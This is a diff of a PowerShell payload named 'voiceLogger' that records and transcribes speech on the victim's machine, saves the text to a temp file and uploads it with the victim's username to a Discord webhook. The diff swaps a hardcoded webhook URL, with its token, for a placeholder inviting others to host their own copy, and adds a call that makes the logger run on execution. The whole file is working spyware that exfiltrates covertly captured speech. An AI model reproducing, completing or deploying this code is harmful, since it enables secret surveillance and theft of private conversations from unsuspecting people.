@@ -6,7 +6,7 @@ function DC-Upload {
 		[string]$text 
 	)
 
-	$dc = 'https://discord.com/api/webhooks/1170420927738167317/6l-HCbVvYQHbo1k2Rrcnx3w2x8ob5oxfEwVsV6uU0FAE_DMaTcX-Y2JksGN4fPZ878Uw'
+	# $dc = 'YOUR DISCORD WEBHOOK GOES HERE IF YOU HOST YOUR OWN VERSION OF THIS PAYLOAD'
 
 	$Body = @{
 	  'username' = $env:username
@@ -32,7 +32,7 @@ function voiceLogger {
             $results = $result.Text
             Write-Output $results
             $log = "$env:tmp/VoiceLog.txt"
-	    echo $results > $log
+            echo $results > $log
             $text = get-content $log -raw
             DC-Upload $text
 
@@ -46,4 +46,4 @@ function voiceLogger {
     Clear-Content -Path $log
 }
 
-
+voiceLogger
